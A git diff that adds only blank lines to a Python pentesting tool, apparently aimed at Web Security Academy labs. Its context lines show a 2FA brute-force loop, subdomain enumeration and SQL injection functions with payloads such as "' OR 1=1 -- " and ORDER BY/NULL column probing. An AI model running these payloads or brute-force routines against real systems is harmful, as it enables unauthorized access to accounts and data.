@@ -14,6 +14,7 @@ def bug_bundy():
     print(" ██████   ██████   ██████      ██████   ██████   ██████  ██   ████    ██       ██    ")
     print("\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t\t by Tom Thomas")
     print("\n")
+    
 def subdomains():
     url=input("Enter the URL without http:// or https:// ")
     subfile=input("Enter the path of wordlist ")
@@ -175,6 +176,7 @@ def two_FA_broken_logic(url):
         if "Incorrect security code" not in r.text:
             print(i)
             break
+            
 def Broken_Authentication():
     while True:
         print("\n")
@@ -229,6 +231,7 @@ def replaceNth(s, source, target, n) :
     s = list(s)
     s[inds[n-1]: inds [n-1]+len(source)] = target
     return ''.join(s)
+    
 def SQl_injection_retrieval_of_hidden_data(url):
     OR = ["' OR 1=1 -- ","' OR '1'='1 -- "]
     ORDERby = ["' ORDER BY "]
@@ -246,6 +249,7 @@ def SQl_injection_retrieval_of_hidden_data(url):
         else:
             print("Total Number of columns are {} ".format(i-1))
             return i
+            
     print("Trying number of columns with NULL ...")
     for i in range(1, 50):
         query = "NULL," * i
@@ -300,6 +304,7 @@ def main():
             SQL_injection()
         else:
             break
+            
 if __name__ == "__main__":
     main()
 #https://0a0300ff041ad69c85a41ce500f8000c.web-security-academy.net/login
